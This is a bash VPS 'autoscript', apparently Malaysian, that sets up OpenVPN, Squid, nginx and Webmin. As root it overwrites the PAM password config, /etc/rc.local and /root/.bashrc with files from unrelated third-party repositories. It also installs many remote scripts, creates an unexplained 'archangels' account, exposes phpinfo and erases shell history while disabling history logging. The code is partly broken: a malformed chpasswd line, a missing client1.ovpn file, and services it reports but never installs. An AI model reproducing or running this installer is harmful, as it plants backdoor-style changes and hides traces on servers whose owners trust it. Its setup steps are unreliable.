#!/bin/bash
# ******************************************
# Program: OrangKuatSabahanTerkini Servis 
# Website: OrangKuatSabahanTerkini.tk
# Developer: OrangKuatSabahanTerkini
# Nickname: OrangKuatSabahanTerkini
# Date: 22-07-2016
# Last Updated: 22-08-2017
# ******************************************
# MULA SETUP
myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
if [ $USER != 'root' ]; then
echo "Sorry, for run the script please using root user"
exit 1
fi
if [[ "$EUID" -ne 0 ]]; then
echo "Sorry, you need to run this as root"
exit 2
fi
if [[ ! -e /dev/net/tun ]]; then
echo "TUN is not available"
exit 3
fi
echo "
AUTOSCRIPT BY OrangKuatSabahanTerkini
AMBIL PERHATIAN !!!"
clear
echo "MULA SETUP"
clear
echo "SET TIMEZONE KUALA LUMPUT GMT +8"
ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;
clear
echo "
ENABLE IPV4 AND IPV6
SILA TUNGGU SEDANG DI SETUP
"
echo ipv4 >> /etc/modules
echo ipv6 >> /etc/modules
sysctl -w net.ipv4.ip_forward=1
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
sed -i 's/#net.ipv6.conf.all.forwarding=1/net.ipv6.conf.all.forwarding=1/g' /etc/sysctl.conf
sysctl -p
clear
echo "
MEMBUANG SPAM PACKAGE
"
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove postfix*;
apt-get -y --purge remove bind*;
clear
echo "
"
sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
apt-get update;
apt-get -y autoremove;
apt-get -y install wget curl;
echo "
"
apt update && apt upgrade -y
# text gambar
apt-get install boxes

# color text
cd
rm -rf /root/.bashrc
wget -O /root/.bashrc "https://raw.githubusercontent.com/padubang/gans/main/.bashrc"

# install lolcat
sudo apt-get -y install ruby
sudo gem install lolcat

# script
wget -O /etc/pam.d/common-password "https://raw.githubusercontent.com/macisvpn/premiumnow/master/common-password"
chmod +x /etc/pam.d/common-password

# squid3
apt-get -y install squid3
wget -O /etc/squid3/squid.conf "https://raw.githubusercontent.com/insanpendosa/pendosa/main/squid.conf"
wget -O /etc/squid/squid.conf "https://raw.githubusercontent.com/insanpendosa/pendosa/main/squid.conf"
sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
sed -i "s/ipserver/$myip/g" /etc/squid/squid.conf
sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf# openvpn

# nginx
apt-get -y install nginx
apt-get -y install php7.0-fpm
apt-get -y install php7.0-cli
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/php/7.0/fpm/pool.d/www.conf "https://raw.githubusercontent.com/KeningauVPS/sslmode/master/www.conf"
mkdir -p /home/vps/public_html
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
wget -O /home/vps/public_html/index.html https://raw.githubusercontent.com/padubang/secret/main/index.html
wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/ara-rangers/vps/master/vps.conf"
sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
service php7.0-fpm restart

#  openvpn
apt-get -y install openvpn
cd /etc/openvpn/
wget -O openvpn.tar "https://raw.githubusercontent.com/bengali89/tls/main/Bsbdvk/openvpn.tar"
tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/rc.local "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/rc.local"
chmod +x /etc/rc.local
# etc
wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/bengali89/tls/main/Bsbdvk/client.ovpn"
wget -O /home/vps/public_html/udp.ovpn "https://raw.githubusercontent.com/bengali89/Haruhara/main/joie8383/udp.ovpn"
wget -O /home/vps/public_html/ovpnssl.ovpn "https://raw.githubusercontent.com/bengali89/Haruhara/main/joie8383/ovpnssl.ovpn"
wget -O /home/vps/public_html/client3.ovpn "https://gakod.com/debian/client3.ovpn"
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/udp.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client1.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client3.ovpn
useradd -m -g users -s /bin/bash archangels
echo "7C22C4ED" | chpasswd
echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;

# download script
cd /usr/bin
wget -O menu "https://raw.githubusercontent.com/acillsadank/install/master/menu.sh"
wget -O edit "https://raw.githubusercontent.com/acillsadank/install/master/edit-ports.sh"
wget -O edit-dropbear "https://raw.githubusercontent.com/acillsadank/install/master/edit-dropbear.sh"
wget -O edit-openssh "https://raw.githubusercontent.com/acillsadank/install/master/edit-openssh.sh"
wget -O edit-openvpn "https://raw.githubusercontent.com/acillsadank/install/master/edit-openvpn.sh"
wget -O edit-squid3 "https://raw.githubusercontent.com/acillsadank/install/master/edit-squid3.sh"
wget -O edit-stunnel4 "https://raw.githubusercontent.com/acillsadank/install/master/edit-stunnel4.sh"
wget -O show-ports "https://raw.githubusercontent.com/acillsadank/install/master/show-ports.sh"
wget -O usernew "https://raw.githubusercontent.com/acillsadank/install/master/usernew.sh"
wget -O trial "https://raw.githubusercontent.com/acillsadank/install/master/trial.sh"
wget -O delete "https://raw.githubusercontent.com/acillsadank/install/master/delete.sh"
wget -O check "https://raw.githubusercontent.com/acillsadank/install/master/user-login.sh"
wget -O member "https://raw.githubusercontent.com/acillsadank/install/master/user-list.sh"
wget -O restart "https://raw.githubusercontent.com/acillsadank/install/master/restart.sh"
wget -O speedtest "https://raw.githubusercontent.com/acillsadank/install/master/speedtest_cli.py"
wget -O info "https://raw.githubusercontent.com/acillsadank/install/master/info.sh"
wget -O about "https://raw.githubusercontent.com/acillsadank/install/master/about.sh"
wget -O /usr/local/bin/auto-reboot "https://raw.githubusercontent.com/blackestsaint/Korn/master/auto-reboot"

chmod +x menu
chmod +x edit
chmod +x edit-dropbear
chmod +x edit-openssh
chmod +x edit-openvpn
chmod +x edit-squid3
chmod +x edit-stunnel4
chmod +x show-ports
chmod +x usernew
chmod +x trial
chmod +x delete
chmod +x check
chmod +x member
chmod +x restart
chmod +x speedtest
chmod +x info
chmod +x about
chmod +x /usr/local/bin/auto-reboot

# finishing
cd
chown -R www-data:www-data /home/vps/public_html
/etc/init.d/nginx restart
/etc/init.d/openvpn restart
/etc/init.d/cron restart
/etc/init.d/squid start
/etc/init.d/service php7.0-fpm restart
rm -rf ~/.bash_history && history -c
echo "unset HISTFILE" >> /etc/profile

# grep ports 
opensshport="$(netstat -ntlp | grep -i ssh | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
dropbearport="$(netstat -nlpt | grep -i dropbear | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
stunnel4port="$(netstat -nlpt | grep -i stunnel | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
openvpnport="$(netstat -nlpt | grep -i openvpn | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
squidport="$(cat /etc/squid/squid.conf | grep -i http_port | awk '{print $2}')"
nginxport="$(netstat -nlpt | grep -i nginx| grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
# SELASAI SUDAH BOSS! ( AutoscriptByOrangKuatSabahanTerkini )
echo "========================================"  | tee -a log-install.txt
echo "Service Autoscript OrangKuatSabahanTerkini (OrangKuatSabahanTerkini SCRIPT 2017)"  | tee -a log-install.txt
echo "----------------------------------------"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "nginx : http://$myip:80"   | tee -a log-install.txt
echo "Webmin : http://$myip:10000/"  | tee -a log-install.txt
echo "Squid3 : 8080"  | tee -a log-install.txt
echo "OpenSSH : 22"  | tee -a log-install.txt
echo "Dropbear : 443"  | tee -a log-install.txt
echo "OpenVPN  : TCP 1194 (sila dapatkan ovpn dari OrangKuatSabahanTerkini)"  | tee -a log-install.txt
echo "Fail2Ban : [on]"  | tee -a log-install.txt
echo "Timezone : Asia/Kuala_Lumpur"  | tee -a log-install.txt
echo "Menu : type menu to check menu script"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "----------------------------------------"
echo "LOG INSTALL  --> /root/log-install.txt"
echo "----------------------------------------"
echo "========================================"  | tee -a log-install.txt
echo "      PLEASE REBOOT TO TAKE EFFECT !"
echo "========================================"  | tee -a log-install.txt
cat /dev/null > ~/.bash_history && history -c
